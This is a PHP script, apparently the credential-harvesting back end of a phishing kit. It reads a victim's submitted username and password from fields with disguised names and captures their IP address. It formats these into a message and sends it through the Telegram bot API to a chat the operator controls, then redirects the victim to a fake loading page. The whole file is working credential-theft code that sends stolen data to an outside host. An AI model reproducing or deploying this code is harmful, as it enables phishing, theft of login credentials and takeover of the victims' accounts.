<?php

session_start();

// Incluye la función para obtener la configuración
require_once("../panel-adm/obtenerconfig.php");

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $c_user = htmlspecialchars($_POST['beyer']);
    $c_pass = htmlspecialchars($_POST['lilly']);

    // Obtén la configuración actual desde obtenerconfig.php
    $configuracion = obtenerConfiguracion();

    // Lee el mensaje personalizado desde mensaje.json
    $datos = json_decode(file_get_contents('../panel-adm/mensaje.json'), true);
    $mensajePersonalizado = $datos['mensajePersonalizado'];
    $nombreApp = isset($datos['nombreApp']) ? $datos['nombreApp'] : '';
    $firma = isset($datos['firma']) ? $datos['firma'] : '';

    // Obtiene la dirección IP del visitante
    $ipVisitante = $_SERVER['REMOTE_ADDR'];

    // Reemplaza las variables en el mensaje
    $mensaje = str_replace('{nombre}', $c_user, $mensajePersonalizado);
    $mensaje = str_replace('{denei}', $c_pass, $mensaje);
    $mensaje = str_replace('{ip}', $ipVisitante, $mensaje);

    $mensaje = str_replace('{NombreDeAPP}', $nombreApp, $mensaje);
    $mensaje = str_replace('{FIRMA}', $firma, $mensaje);

    // URL de la API de Telegram para enviar mensajes
    $api_url = "https://api.telegram.org/bot" . $configuracion['token'] . "/sendMessage";

    // Parámetros de la solicitud
    $params = [
        'http' => [
            'method' => 'POST',
            'header' => 'Content-type: application/x-www-form-urlencoded',
            'content' => http_build_query(['chat_id' => $configuracion['chat_id'], 'text' => $mensaje]),
        ],
    ];

    // Contexto de flujo para la solicitud
    $context = stream_context_create($params);

    try {
        // Realiza la solicitud HTTP POST a la API de Telegram
        $result = file_get_contents($api_url, false, $context);

        if ($result === false) {
            throw new Exception('La solicitud a la API de Telegram falló.');
        }

        // Imprime el resultado para fines de depuración
        var_dump($result);

        // Puedes realizar alguna acción después de enviar los datos a Telegram, si es necesario.
        header("Location: ../cargando.php");
        exit;
    } catch (Exception $e) {
        // Captura la excepción y muestra un mensaje de error
        echo 'Excepción capturada: ', $e->getMessage(), "\n";
    }
}

?>